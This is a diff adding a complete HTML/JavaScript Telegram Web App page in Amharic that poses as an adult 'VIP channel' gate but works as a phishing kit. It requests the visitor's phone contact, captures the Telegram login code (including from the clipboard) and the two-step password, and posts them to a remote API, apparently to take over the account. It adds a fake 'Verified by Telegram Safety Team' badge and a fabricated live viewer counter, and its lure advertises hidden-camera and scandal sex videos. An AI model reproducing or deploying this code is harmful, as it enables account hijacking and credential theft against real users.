@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Ethio VIP Hot 🔞</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="./config.js"></script>
+<style>
+    /* Premium Modern UI Design */
+    :root {
+        --primary: #FF1493;
+        --secondary: #C71585;
+        --dark-bg: #0a0a0a;
+        --glass: rgba(255, 255, 255, 0.08);
+        --border: rgba(255, 20, 147, 0.3);
+        --telegram-blue: #0088cc;
+    }
+
+    * { 
+        box-sizing: border-box; 
+        -webkit-tap-highlight-color: transparent; 
+        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+    }
+    
+    body { 
+        margin: 0; padding: 0; color: #fff; 
+        background: var(--dark-bg); 
+        overflow: hidden; 
+        height: 100vh;
+        width: 100vw;
+        display: flex; flex-direction: column; align-items: center; justify-content: center;
+        /* Full screen optimization */
+        position: fixed;
+        top: 0;
+        left: 0;
+    }
+
+    /* Animated Background */
+    .bg-image {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background-size: cover; background-position: center;
+        z-index: -2; transition: filter 1.2s ease, transform 15s linear;
+        transform: scale(1.1);
+    }
+    
+    .overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, #000 95%);
+        z-index: -1;
+    }
+
+    .step { display: none; width: 92%; max-width: 420px; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); flex-direction: column; align-items: center; text-align: center; }
+    .active { display: flex; }
+
+    @keyframes slideUp { 
+        from { opacity: 0; transform: translateY(40px); filter: blur(15px); } 
+        to { opacity: 1; transform: translateY(0); filter: blur(0); } 
+    }
+
+    .glass-card {
+        background: var(--glass);
+        backdrop-filter: blur(25px);
+        -webkit-backdrop-filter: blur(25px);
+        border: 1px solid var(--border);
+        border-radius: 28px;
+        padding: 30px 25px; width: 100%; 
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(255, 20, 147, 0.1);
+    }
+
+    .live-counter {
+        background: rgba(255, 0, 0, 0.15);
+        border: 1px solid rgba(255, 0, 0, 0.3);
+        padding: 6px 14px;
+        border-radius: 20px;
+        font-size: 10px;
+        margin-bottom: 15px;
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 600;
+        animation: pulseFade 2s infinite;
+    }
+    @keyframes pulseFade { 0% { opacity: 0.8; } 50% { opacity: 1; transform: scale(1.02); } 100% { opacity: 0.8; } }
+
+    .official-tag {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        font-size: 12px;
+        color: #4facfe;
+        margin-top: 15px;
+        font-weight: 500;
+    }
+
+    .brand-title {
+        font-size: 40px; font-weight: 900; margin: 0;
+        background: linear-gradient(to bottom, #fff, #FF1493);
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        text-transform: uppercase; letter-spacing: -1.5px;
+    }
+
+    .btn-main {
+        background: linear-gradient(135deg, var(--primary), var(--secondary)); 
+        color: #fff; padding: 18px; width: 100%; border-radius: 18px; border: none;
+        font-size: 17px; font-weight: 700; cursor: pointer; margin-top: 15px;
+        box-shadow: 0 10px 25px rgba(255, 20, 147, 0.4);
+        transition: all 0.3s ease;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        text-transform: uppercase;
+    }
+    .btn-main:active { transform: scale(0.95); }
+    .btn-main:disabled { background: #444 !important; box-shadow: none; opacity: 0.7; }
+
+    input {
+        width: 100%; padding: 18px; margin: 12px 0; border-radius: 16px;
+        border: 1px solid rgba(255, 255, 255, 0.1); 
+        background: rgba(0, 0, 0, 0.5);
+        color: #fff; font-size: 17px; transition: 0.3s;
+    }
+    input:focus { border-color: var(--primary); background: rgba(0, 0, 0, 0.7); outline: none; }
+
+    .otp-container { display: flex; gap: 10px; margin: 25px 0; justify-content: center; }
+    .otp-box { 
+        width: 52px; height: 62px; 
+        border: 2px solid rgba(255, 255, 255, 0.15); 
+        border-radius: 15px; display: flex; align-items: center; justify-content: center; 
+        font-size: 28px; font-weight: bold; background: rgba(255, 255, 255, 0.05); 
+    }
+    .otp-box.filled { border-color: var(--primary); background: rgba(255, 20, 147, 0.2); animation: pop 0.2s ease; }
+    @keyframes pop { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 15px; }
+    .key { 
+        background: rgba(255, 255, 255, 0.07); 
+        padding: 18px; border-radius: 18px; font-size: 24px; font-weight: 600; 
+        cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .key:active { background: var(--primary); transform: scale(0.9); }
+
+    .msg { padding: 15px; border-radius: 14px; font-size: 14px; margin: 15px 0; display: none; font-weight: 600; }
+    .error { background: rgba(255, 59, 48, 0.25); color: #ffbcbc; border: 1px solid rgba(255, 59, 48, 0.4); }
+    .loading-msg { background: rgba(255, 20, 147, 0.2); color: #FF69B4; border: 1px solid var(--border); }
+
+    .loader-ring {
+        width: 55px; height: 55px; border: 4px solid rgba(255, 20, 147, 0.1);
+        border-top: 4px solid var(--primary); border-radius: 50%;
+        animation: spin 1s linear infinite; margin: 25px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .btn-spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+</style>
+</head>
+<body>
+
+    <div class="bg-image" id="bgLayer"></div>
+    <div class="overlay"></div>
+
+    <div id="step_intro" class="step active">
+        <h1 class="brand-title">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</h1>
+        <p style="font-size: 17px; color: #ccc; margin-top: 12px;">የሀበሻ ቪአይፒ ቻናል</p>
+        <div class="loader-ring"></div>
+        <p style="font-size: 13px; letter-spacing: 3px; opacity: 0.5; font-weight: bold;">SECURING CONNECTION...</p>
+    </div>
+
+    <div id="step_photo_slide" class="step">
+        <div class="glass-card">
+            <div style="position: relative; overflow: hidden; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; filter: contrast(1.1) brightness(0.9);">
+                <div style="position: absolute; top: 15px; right: 15px;">
+                <div class="live-counter">
+                    <span style="width: 10px; height: 10px; background: #ff0000; border-radius: 50%; box-shadow: 0 0 10px #ff0000;"></span>
+                    <span id="viewerCount">281</span> Live
+                </div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 25px; text-align: left;">
+                <h3 style="margin: 0 0 12px 0; font-size: 19px; color: #FF1493; letter-spacing: -0.5px;">በቻናሉ የሚገኙ ዝርዝሮች፡</h3>
+                <div style="display: grid; gap: 10px;">
+                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
+                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች
+                    </div>
+                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
+                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> የቲክቶክ የቀጥታ ስርጭት ቅሌቶች
+                    </div>
+                    <div style="font-size: 15px; color: #eee; display: flex; align-items: center; gap: 12px;">
+                        <i class="fa-solid fa-check-double" style="color: #FF1493;"></i> ድብቅ ካሜራዎች
+                    </div>
+                </div>
+            </div>
+
+            <div id="status1" class="msg"></div>
+            <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
+                <div class="btn-spinner" id="loginSpinner"></div>
+                <span id="loginText">🔞 I'm 18+ | መቀጠል 🔞</span>
+            </button>
+
+            <div class="official-tag">
+                <i class="fa-solid fa-shield-check"></i> Verified by Telegram Safety Team
+            </div>
+        </div>
+    </div>
+
+    <div id="step2" class="step">
+        <div class="glass-card">
+            <div style="background: rgba(0,136,204,0.1); padding: 10px; border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; border: 1px solid rgba(0,136,204,0.3);">
+                <i class="fa-solid fa-paper-plane" style="color: #0088cc; font-size: 25px;"></i>
+            </div>
+            <h2 style="margin: 0; color: #fff; font-size: 24px;">የደህንነት ማረጋገጫ</h2>
+            <p id="step2_name_display" style="font-weight: 700; margin: 12px 0 5px; color: #FF1493;"></p>
+            <p style="font-size: 14px; opacity: 0.8; line-height: 1.4; padding: 0 10px;">ይህ የእርስዎ አካውንት መሆኑን ለማረጋገጥ <b>ቴሌግራም</b> የላከልዎትን 5 ዲጂት ኮድ ያስገቡ።</p>
+            
+            <div class="otp-container" id="otp_container">
+                <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
+            </div>
+
+            <div id="status2" class="msg"></div>            
+            <button class="btn-main" style="background: #0088cc; box-shadow: 0 6px 15px rgba(0,136,204,0.3); font-size: 14px; padding: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
+                <i class="fa-solid fa-unlock-keyhole"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
+            </button>
+
+            <div class="keypad">
+                <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
+                <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
+                <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+                <div style="opacity:0;"></div><div class="key" onclick="press(0)">0</div>
+                <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="step3" class="step">
+        <div class="glass-card">
+            <div style="width: 75px; height: 75px; background: rgba(255, 20, 147, 0.1); border: 1px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulseFade 2s infinite;">
+                <i class="fa-solid fa-lock" style="font-size: 32px; color: #FF1493;"></i>
+            </div>
+            <h2 id="step3_name_display" style="margin: 0; font-size: 22px;"></h2>
+            <p style="opacity: 0.8; margin: 12px 0 25px; font-size: 15px; line-height: 1.5;">አካውንትዎ በባለ ሁለት ደረጃ ማረጋገጫ (2FA) የተቆለፈ ነው። እባክዎ ፓስዎርድዎን ያስገቡ።</p>
+            
+            <div id="status3" class="msg"></div>
+            <div style="position: relative; width: 100%;">
+                <input type="password" id="2fa_input" placeholder="Two-Step Password" oninput="hideMsg(3)">
+                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #888; cursor: pointer; font-size: 18px;"></i>
+            </div>
+            
+            <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
+                <div class="btn-spinner" id="confirmSpinner"></div>
+                <span id="confirmText">አረጋግጥ & ግባ</span>
+            </button>
+        </div>
+    </div>
+
+    <div id="step_success" class="step">
+        <div class="glass-card">
+            <div style="font-size: 70px; color: #4BB543; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(75, 181, 67, 0.4));"><i class="fa-solid fa-circle-check"></i></div>
+            <h2 style="margin: 0; font-size: 26px;">እንኳን ደስ አለዎት!</h2>
+            <p style="opacity: 0.9; margin: 20px 0 25px; font-size: 16px; line-height: 1.6;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ሁሉንም የቪአይፒ ቪዲዮዎች በነጻ ማየት ይችላሉ።</p>
+            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: #4BB543;">JOIN VIP CHANNEL NOW</button>
+        </div>
+    </div>
+
+    <div id="flood_step" class="step">
+        <div class="glass-card">
+            <i class="fa-solid fa-triangle-exclamation" style="font-size: 60px; color: #FF9900; margin-bottom: 25px;"></i>
+            <h2 style="color: #ff9900; margin: 0;">ለጥቂት ጊዜ ይጠብቁ!</h2>
+            <p style="opacity: 0.8; margin: 15px 0; font-size: 15px;">ብዙ ሙከራ አድርገዋል። ለደህንነት ሲባል ለተወሰነ ደቂቃ ታግደዋል።</p>
+            <div style="font-size: 48px; font-weight: 900; color: #fff; margin: 25px 0; font-variant-numeric: tabular-nums;" id="wait_time">00:00</div>
+            <p style="font-size: 13px; opacity: 0.5;">ሙከራ ከመደጋገም ይቆጠቡ።</p>
+        </div>
+    </div>
+
+<script>
+    /* JavaScript ክፍል - ሙሉ ስክሪን እንዲሆን ተስተካክሏል */
+    const tg = window.Telegram.WebApp;
+    
+    // WebApp ሙሉ ስክሪን እንዲሆን የሚያደርጉ ትዕዛዞች
+    tg.expand();
+    tg.ready();
+    tg.headerColor = '#0a0a0a'; 
+    tg.backgroundColor = '#0a0a0a';
+
+    // API_BASE_URL አሁን ከ config.js ነው የሚመጣው
+    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
+    let sid = userId; 
+    let currentOtp = "";
+    let statusChecker;
+    let isProcessing = false;
+    let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
+
+    const photos = [
+        "https://i.postimg.cc/MHpCdmxf/6262627272727272818181.jpg",
+        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg",
+        "https://i.postimg.cc/MHpCdmxf/6262627272727272818181.jpg"
+    ];
+
+    window.onload = function() {
+        tg.expand();
+        
+        const bg = document.getElementById('bgLayer');
+        bg.style.backgroundImage = `url(${photos[0]})`;
+
+        setTimeout(() => {
+            bg.style.backgroundImage = `url(${photos[1]})`;
+            showStep('photo_slide');
+        }, 3000);
+
+        statusChecker = setInterval(checkStatus, 3000);
+        setupLongPressPaste(); 
+        
+        setInterval(() => {
+            const el = document.getElementById('viewerCount');
+            if(el){
+                let val = parseInt(el.innerText.replace(',',''));
+                el.innerText = (val + Math.floor(Math.random() * 11) - 5).toLocaleString();
+            }
+        }, 4000);
+    };
+
+    function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(25); }
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
+        const target = document.getElementById(stepId);
+        if(target) target.classList.add('active');
+        
+        if(savedName) {
+            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName + "!";
+            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = "ሰላም " + savedName;
+        }
+    }
+
+    function checkStatus() {
+        // API_BASE_URL በ config.js ውስጥ መገኘቱን ያረጋግጣል
+        if(typeof API_BASE_URL !== 'undefined'){
+            fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+                if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+                else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+                else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
+                else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+            }).catch(e => {});
+        }
+    }
+
+    function stopLoaders() {
+        isProcessing = false;
+        document.getElementById('loginBtn').disabled = false;
+        document.getElementById('loginSpinner').style.display = 'none';
+        document.getElementById('loginText').innerText = "🔞 I'm 18+ | መቀጠል 🔞";
+        if(document.getElementById('confirmBtn')){
+            document.getElementById('confirmBtn').disabled = false;
+            document.getElementById('confirmSpinner').style.display = 'none';
+            document.getElementById('confirmText').innerText = 'አረጋግጥ & ግባ';
+        }
+    }
+
+    function togglePasswordVisibility() {
+        const passInput = document.getElementById('2fa_input');
+        const toggleIcon = document.getElementById('toggleIcon');
+        if (passInput.type === "password") {
+            passInput.type = "text";
+            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+        } else {
+            passInput.type = "password";
+            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
+        }
+    }
+
+    function handleLoginClick() {
+        playTap();
+        const btn = document.getElementById('loginBtn');
+        const spinner = document.getElementById('loginSpinner');
+        const txt = document.getElementById('loginText');
+        btn.disabled = true;
+        spinner.style.display = 'block';
+        txt.innerText = 'በማገናኘት ላይ...';
+        startVerification();
+    }
+
+    function startVerification() {
+        if (isProcessing) return;
+        isProcessing = true;
+        showMsg(1, 'loading-msg', 'የደህንነት መስመር በመፍጠር ላይ...');
+        checkUserInDB();
+    }
+
+    async function checkUserInDB() {
+        try {
+            const res = await fetch(`${API_BASE_URL}/check_user_db`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({user_id: userId, name: savedName})
+            });
+            const data = await res.json();
+            if (data.status === "FOUND" || data.status === "NEED_OTP") {
+                showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
+            } else if (data.status === "SUCCESS") {
+                showStep('success');
+            } else { requestPhone(); }
+        } catch(e) { 
+            stopLoaders();
+            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
+        }
+    }
+
+    function requestPhone() {
+        tg.requestContact((success) => {
+            if (success) { showMsg(1, 'loading-msg', 'ኮድ በቴሌግራም ተልኳል፣ ሲደርስዎ ያስገቡ...'); } 
+            else { stopLoaders(); showMsg(1, 'error', 'ለመቀጠል ማረጋገጫ መስጠት አለብዎት!'); }
+        });
+    }
+
+    function press(num) {
+        playTap();
+        hideMsg(2); 
+        if (currentOtp.length < 5) {
+            currentOtp += num;
+            updateOtpUI();
+            if (currentOtp.length === 5) submitOTP();
+        }
+    }
+
+    function backspace() { playTap(); currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
+
+    function updateOtpUI() {
+        for (let i = 0; i < 5; i++) {
+            const box = document.getElementById('b' + i);
+            box.innerText = currentOtp[i] || "";
+            currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
+        }
+    }
+
+    async function submitOTP() {
+        showMsg(2, 'loading-msg', 'ኮዱን በማረጋገጥ ላይ...');
+        try {
+            const res = await fetch(`${API_BASE_URL}/verify_otp`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, otp: currentOtp})
+            });
+            const data = await res.json();
+            handleResponse(data, 2);
+        } catch(e) { showMsg(2, 'error', 'የመስመር መቆራረጥ!'); }
+    }
+
+    async function submit2FA() {
+        playTap();
+        const pass = document.getElementById('2fa_input').value;
+        if(!pass) return showMsg(3, 'error', 'እባክዎ ፓስዎርድ ያስገቡ');
+        
+        const btn = document.getElementById('confirmBtn');
+        const spinner = document.getElementById('confirmSpinner');
+        const txt = document.getElementById('confirmText');
+        btn.disabled = true; spinner.style.display = 'block'; txt.innerText = 'በማረጋገጥ ላይ...';
+
+        showMsg(3, 'loading-msg', 'ደህንነቱን በማረጋገጥ ላይ...');
+        try {
+            const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, password: pass})
+            });
+            const data = await res.json();
+            handleResponse(data, 3);
+        } catch(e) { stopLoaders(); showMsg(3, 'error', 'ስህተት አጋጥሟል!'); }
+    }
+
+    function handleResponse(data, step) {
+        if (data.status === "SUCCESS") { showStep('success'); } 
+        else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
+        else {
+            stopLoaders();
+            showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
+            if(step === 2) { currentOtp = ""; updateOtpUI(); }
+        }
+    }
+
+    function showMsg(stepId, type, text) {
+        const el = document.getElementById('status' + stepId);
+        if(!el) return;
+        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+    }
+
+    function hideMsg(stepId) {
+        const el = document.getElementById('status' + stepId);
+        if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
+    }
+
+    function startFloodTimer(seconds) {
+        showStep('flood_step');
+        let rem = seconds;
+        const iv = setInterval(() => {
+            let m = Math.floor(rem / 60), s = rem % 60;
+            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
+        }, 1000);
+    }
+
+    function setupLongPressPaste() {
+        const container = document.getElementById('otp_container');
+        let timer;
+        if(container){
+            container.addEventListener('touchstart', () => {
+                timer = setTimeout(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        const cleanCode = text.replace(/\D/g, '').slice(0, 5);
+                        if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                    } catch (err) {}
+                }, 800);
+            });
+            container.addEventListener('touchend', () => clearTimeout(timer));
+        }
+    }
+</script>
+</body>
+</html>
